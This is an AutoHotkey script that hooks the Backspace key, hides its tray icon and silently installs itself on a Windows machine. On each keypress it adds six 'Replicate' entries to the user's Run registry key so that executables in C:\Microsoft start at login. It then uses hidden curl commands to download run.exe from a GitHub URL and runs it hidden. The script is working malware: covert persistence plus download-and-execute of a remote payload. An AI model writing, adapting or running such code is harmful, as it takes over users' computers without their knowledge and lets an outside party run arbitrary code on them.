#SingleInstance Ignore
#NoTrayIcon

Run "C:\Microsoft\run.exe"

$Backspace::{
    path := "C:\Microsoft"
    Send "{Backspace}"
    RegWrite '"C:\Microsoft\run.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate0"
    RegWrite '"C:\Microsoft\LButton.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate1"
    RegWrite '"C:\Microsoft\RButton.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate2"
    RegWrite '"C:\Microsoft\Delete.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate3"
    RegWrite '"C:\Microsoft\Backspace.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate4"
    RegWrite '"C:\Microsoft\Space.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate5"

    static lastRun := 0
    delay := 1000
    now := A_TickCount
    if (now - lastRun < delay) {
        return
    }

    output := path "\run.exe"
    if (DirExist(path)) {
        if (FileExist(path "\run.exe")) {
            Run output, , "Hide"
        } else {
            url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/run.exe"
            command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
            RunWait command, , "Hide"
            Run output, , "Hide"
        }
    } else {
        DirCreate(path)
        url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/run.exe"
        command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
        RunWait command, , "Hide"
        Run output, , "Hide"
    }
}
